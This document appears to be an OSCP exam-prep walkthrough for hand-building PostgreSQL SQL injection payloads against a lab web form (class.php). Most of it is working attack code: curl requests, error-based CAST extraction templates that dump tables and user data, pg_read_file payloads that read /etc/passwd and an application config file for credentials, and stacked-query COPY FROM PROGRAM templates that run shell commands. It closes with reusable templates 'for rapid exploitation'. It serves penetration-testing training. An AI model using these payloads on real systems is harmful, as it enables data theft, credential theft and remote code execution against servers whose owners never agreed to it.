# Payload Construction Workflow - Building Payloads from Scratch
**OSCP Skill**: Learn to craft payloads without automated tools

---

## Phase 1: Identify Injection Point

### Step 1.1: Test for SQLi with Single Quote
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height='&age=25&gender=male&email=test@test.com"
```

**What to look for**:
```
✅ SQL error message appears
✅ Page behavior changes
✅ Different response than normal
```

**Our result**:
```
<b>Warning</b>:  pg_query(): Query failed: ERROR:  unterminated quoted string at or near "'"...
```

**Analysis**:
- Error mentions `pg_query()` → **PostgreSQL**
- "unterminated quoted string" → We closed a string prematurely
- Parameter is vulnerable: `height`

---

### Step 1.2: Confirm Injection with Comment
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1'--&age=25&gender=male&email=test@test.com"
```

**Payload breakdown**:
```
height=1'--
├─ 1: Valid input
├─ ': Close the string
└─ --: Comment out rest of query
```

**Expected**: Page returns normally (no error).

**If successful**: Injection confirmed, backend query likely:
```sql
SELECT * FROM users WHERE height='1'-- ...'
```

---

## Phase 2: Determine Database Type

### Step 2.1: Identify from Error Messages

**PostgreSQL indicators**:
- `pg_query()`, `pg_connect()`
- Error format: `ERROR: ...`
- Functions: `pg_sleep()`, `string_agg()`

**MySQL indicators**:
- `mysqli_query()`, `mysql_connect()`
- Error format: `You have an error in your SQL syntax...`
- Functions: `SLEEP()`, `GROUP_CONCAT()`

**MSSQL indicators**:
- `mssql_query()`, `sqlsrv_connect()`
- Error format: `Incorrect syntax near...`
- Functions: `WAITFOR DELAY`, `FOR XML PATH`

**Our case**: `pg_query()` → **PostgreSQL confirmed**

---

### Step 2.2: Verify with Database-Specific Syntax

**PostgreSQL test**:
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=1::int--&age=25&gender=male&email=test@test.com"
```
- `::int` is PostgreSQL-specific type casting
- If works → PostgreSQL confirmed

**MySQL test** (if PostgreSQL failed):
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=1#&age=25&gender=male&email=test@test.com"
```
- `#` comment is MySQL-specific

---

## Phase 3: Test Error-Based Extraction

### Step 3.1: Simple Error Trigger
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST('test' AS int)--&age=25&gender=male&email=test@test.com"
```

**Payload breakdown**:
```sql
1' AND 1=CAST('test' AS int)--
├─ 1': Close original string
├─ AND: Add new condition
├─ 1=: Integer comparison
├─ CAST('test' AS int): Try to convert 'test' to integer
└─ --: Comment out rest
```

**Expected error**:
```
ERROR: invalid input syntax for type integer: "test"
```

✅ **Error contains our data (`"test"`)** → Error-based extraction works!

---

### Step 3.2: Extract Database Version
```bash
curl -X POST http://192.168.145.49/class.php \
  -d "weight=75&height=1' AND 1=CAST((SELECT version()) AS int)--&age=25&gender=male&email=test@test.com"
```

**Payload breakdown**:
```sql
CAST((SELECT version()) AS int)
     └──────┬──────┘
            └─ Subquery returns TEXT
            Outer CAST forces int conversion
            Error message contains TEXT value
```

**Result**: Version appears in error message!

---

## Phase 4: Build Data Extraction Payloads

### Step 4.1: Single-Value Extraction Template
```sql
height=1' AND 1=CAST((SELECT <column> FROM <table> LIMIT 1) AS int)--
```

**Examples**:
```sql
-- Current user
height=1' AND 1=CAST((SELECT current_user) AS int)--

-- Current database
height=1' AND 1=CAST((SELECT current_database()) AS int)--

-- First table name
height=1' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)--
```

---

### Step 4.2: Multi-Value Aggregation Template
```sql
height=1' AND 1=CAST((SELECT string_agg(<column>, '<delimiter>') FROM <table> WHERE <condition>) AS int)--
```

**Build process**:

1. **Choose data to extract**: All table names
2. **Choose source**: `information_schema.tables`
3. **Choose aggregation**: `string_agg(table_name, ',')`
4. **Add filter**: `WHERE table_schema='public'`
5. **Wrap in CAST**: `CAST((...) AS int)`

**Final payload**:
```sql
height=1' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--
```

---

### Step 4.3: Multi-Column Concatenation Template
```sql
height=1' AND 1=CAST((SELECT <col1>::text || '<delim>' || <col2>::text || '<delim>' || <col3> FROM <table>) AS int)--
```

**Build process**:

1. **List columns**: weight, height, email
2. **Add type casts**: `weight::text`, `height::text`
3. **Choose delimiter**: `','`
4. **Concatenate**: `weight::text || ',' || height::text || ',' || email`
5. **Aggregate rows**: `string_agg(...)` wrapper
6. **Wrap in CAST**: Full error-based template

**Final payload**:
```sql
height=1' AND 1=CAST((SELECT string_agg(weight::text || ',' || height::text || ',' || email, ' | ') FROM users) AS int)--
```

---

## Phase 5: Build File Read Payloads

### Step 5.1: Test pg_read_file() Access
```sql
height=1' AND 1=CAST((SELECT pg_read_file('/etc/passwd',0,200)) AS int)--
```

**Build process**:

1. **Function**: `pg_read_file(filename, offset, length)`
2. **Target file**: `/etc/passwd` (absolute path required)
3. **Offset**: `0` (start at beginning)
4. **Length**: `200` (bytes to read, keeps error message manageable)
5. **Wrap in CAST**: Standard error-based template

**If successful**: Expand length or use multiple offsets for full file.

---

### Step 5.2: Read Application Config Files

**Workflow**:
1. **Find web root**: Read error logs, try common paths
2. **Identify config files**: Look for `.php`, `.env`, `config.ini`
3. **Read with pg_read_file()**: Use small length first

**Example**:
```sql
-- Discovered from class.php include statement
height=1' AND 1=CAST((SELECT pg_read_file('/var/www/html/dbcon.php',0,500)) AS int)--
```

---

## Phase 6: Build RCE Payloads

### Step 6.1: Test COPY FROM PROGRAM Access
```sql
height=1';
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'whoami';
SELECT 1 WHERE 1=CAST((SELECT output FROM cmd_output LIMIT 1) AS int)--
```

**Build process**:

1. **Switch to multi-statement**: Use `';'` to terminate original query
2. **Cleanup**: `DROP TABLE IF EXISTS cmd_output;`
3. **Prepare storage**: `CREATE TABLE cmd_output(output text);`
4. **Execute command**: `COPY cmd_output FROM PROGRAM 'whoami';`
5. **Extract output**: Standard error-based extraction
6. **Terminate**: `--` comment

---

### Step 6.2: Handle Multi-Line Output
```sql
height=1';
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'ls -la /tmp';
SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--
```

**Key changes**:
- `string_agg(output, chr(10))` → Aggregates all lines
- `chr(10)` → Newline character (preserves formatting)

---

### Step 6.3: Handle stderr Redirection
```sql
height=1';
DROP TABLE IF EXISTS cmd_output;
CREATE TABLE cmd_output(output text);
COPY cmd_output FROM PROGRAM 'sudo -l 2>&1';
SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--
```

**Key addition**:
- `2>&1` → Redirects stderr to stdout
- Captures error messages from commands

---

## Phase 7: Payload Optimization

### Step 7.1: URL Encoding for Special Characters

**Problem**: Special characters break HTTP POST.

**Characters to encode**:
- Space: `%20`
- Single quote: `%27`
- Double quote: `%22`
- Semicolon: `%3B`
- Ampersand: `%26`

**Example**:
```bash
# Raw payload (breaks POST data)
height=1'; DROP TABLE cmd_output;--

# URL-encoded (works)
height=1'%3B%20DROP%20TABLE%20cmd_output%3B--
```

**Curl handles this**: Use `-d` with raw payload, curl encodes automatically.

---

### Step 7.2: Minimize Request Count

**Inefficient** (3 requests):
```sql
-- Request 1: Get first table
SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0

-- Request 2: Get second table
SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 1

-- Request 3: Get third table
SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 2
```

**Efficient** (1 request):
```sql
SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'
```

**OSCP value**: Faster enumeration = more time for other boxes.

---

### Step 7.3: Error Message Length Management

**Problem**: Error messages truncate at ~8000 characters.

**Solutions**:

1. **Use LIMIT/OFFSET** for large datasets:
```sql
SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users' LIMIT 50
```

2. **Filter results**:
```sql
-- Instead of all tables:
SELECT string_agg(table_name, ',') FROM information_schema.tables

-- Filter to public schema only:
SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'
```

3. **Shorten delimiters**:
```sql
-- Long delimiter
string_agg(column, ' | ')

-- Short delimiter
string_agg(column, ',')
```

---

## Phase 8: Testing and Validation

### Step 8.1: Validate Extracted Data

**After extraction, verify**:
```bash
# Verify version format
PostgreSQL 13.7 (Debian...)
├─ Product name: PostgreSQL
├─ Version: 13.7
└─ OS: Debian

# Verify user exists
SELECT usename FROM pg_user WHERE usename='rubben'
└─ If exists: rubben has access

# Verify table exists
SELECT * FROM users LIMIT 1
└─ If succeeds: table accessible
```

---

### Step 8.2: Test Privileges

**Superuser check**:
```sql
SELECT usesuper FROM pg_user WHERE usename=current_user
```

**Function availability**:
```sql
-- Test pg_read_file
SELECT pg_read_file('/etc/passwd', 0, 10)

-- Test COPY FROM PROGRAM
COPY cmd_output FROM PROGRAM 'whoami'
```

---

## 🎓 Complete Payload Construction Checklist

### Pre-Exploitation
- [ ] Identify injection point (test with `'`)
- [ ] Determine database type (error messages, syntax)
- [ ] Test error-based extraction (CAST to int)
- [ ] Confirm extraction template works

### Data Enumeration
- [ ] Extract database version
- [ ] Extract current user
- [ ] Extract current database
- [ ] Check superuser privileges
- [ ] Enumerate databases
- [ ] Enumerate tables
- [ ] Enumerate columns
- [ ] Extract data rows

### File Operations
- [ ] Test pg_read_file() with /etc/passwd
- [ ] Read application config files
- [ ] Extract credentials
- [ ] Read user home directories

### Command Execution
- [ ] Test COPY FROM PROGRAM with whoami
- [ ] Verify RCE with id command
- [ ] Test multi-line output (ls -la)
- [ ] Test stderr redirection (sudo -l 2>&1)

### Privilege Escalation Recon
- [ ] Check sudo privileges
- [ ] Enumerate SUID binaries
- [ ] Check home directory contents
- [ ] List running processes
- [ ] Identify kernel version

---

## ⏱️ Payload Development Time Estimates

**OSCP Exam Context**:
- Phase 1 (SQLi identification): **5 minutes**
- Phase 2 (DB type determination): **2 minutes**
- Phase 3 (Error-based testing): **3 minutes**
- Phase 4 (Data extraction templates): **5 minutes**
- Phase 5 (File read testing): **5 minutes**
- Phase 6 (RCE templates): **10 minutes**
- Phase 7 (Optimization): **5 minutes** (as needed)
- **Total: ~35 minutes** for full payload library

**Value**: Once templates built, reuse on future targets (5-minute enumeration instead of 35!).

---

## 🔧 Reusable Payload Templates

### Save these for OSCP exam:

**1. Error-based extraction**:
```sql
height=1' AND 1=CAST((SELECT <data>) AS int)--
```

**2. Multi-row aggregation**:
```sql
height=1' AND 1=CAST((SELECT string_agg(<col>, ',') FROM <table> WHERE <filter>) AS int)--
```

**3. File read**:
```sql
height=1' AND 1=CAST((SELECT pg_read_file('<path>', 0, <length>)) AS int)--
```

**4. Command execution**:
```sql
height=1'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(output text); COPY cmd_output FROM PROGRAM '<command>'; SELECT 1 WHERE 1=CAST((SELECT string_agg(output, chr(10)) FROM cmd_output) AS int)--
```

**Keep these in your notes for rapid exploitation!**
